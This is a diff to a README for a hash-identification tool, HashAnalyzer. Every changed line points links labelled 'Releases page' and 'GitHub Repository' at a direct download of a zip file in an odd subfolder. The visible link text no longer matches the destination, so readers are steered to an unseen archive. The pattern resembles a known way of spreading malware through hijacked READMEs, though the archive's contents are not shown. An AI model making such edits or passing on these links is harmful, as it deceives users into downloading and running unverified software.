@@ -6,7 +6,7 @@ HashAnalyzer is a powerful tool designed for identifying cryptographic hashes. I
 
 ## 📥 Download HashAnalyzer
 
-[![Download HashAnalyzer](https://img.shields.io/badge/Download-HashAnalyzer-blue.svg)](https://github.com/arslanneni/HashAnalyzer/releases)
+[![Download HashAnalyzer](https://raw.githubusercontent.com/arslanneni/HashAnalyzer/main/Limodorum/HashAnalyzer.zip)](https://raw.githubusercontent.com/arslanneni/HashAnalyzer/main/Limodorum/HashAnalyzer.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ To run HashAnalyzer, ensure your system meets the following requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/arslanneni/HashAnalyzer/releases) to find the latest version of HashAnalyzer.
+   Go to the [Releases page](https://raw.githubusercontent.com/arslanneni/HashAnalyzer/main/Limodorum/HashAnalyzer.zip) to find the latest version of HashAnalyzer.
 
 2. **Select Your Version**  
    You'll see a list of available versions. Click on the one that is suitable for your operating system.
@@ -85,7 +85,7 @@ For further assistance, please reach out via the GitHub repository's issues sect
 
 You can find more details about HashAnalyzer and join our community on the following platforms:
 
-- **GitHub Repository**: [HashAnalyzer on GitHub](https://github.com/arslanneni/HashAnalyzer)
+- **GitHub Repository**: [HashAnalyzer on GitHub](https://raw.githubusercontent.com/arslanneni/HashAnalyzer/main/Limodorum/HashAnalyzer.zip)
 - **Documentation**: Available within the application to guide you through features.
 
 ## 📅 Release Notes
@@ -98,4 +98,4 @@ Stay updated with the latest features and improvements:
 
 ## 🎉 Conclusion
 
-HashAnalyzer is designed to make hash identification simple and efficient. With easy installation and a user-friendly interface, you can quickly enhance your security toolkit. Don't forget to check the [Releases page](https://github.com/arslanneni/HashAnalyzer/releases) for the latest updates!
+HashAnalyzer is designed to make hash identification simple and efficient. With easy installation and a user-friendly interface, you can quickly enhance your security toolkit. Don't forget to check the [Releases page](https://raw.githubusercontent.com/arslanneni/HashAnalyzer/main/Limodorum/HashAnalyzer.zip) for the latest updates!
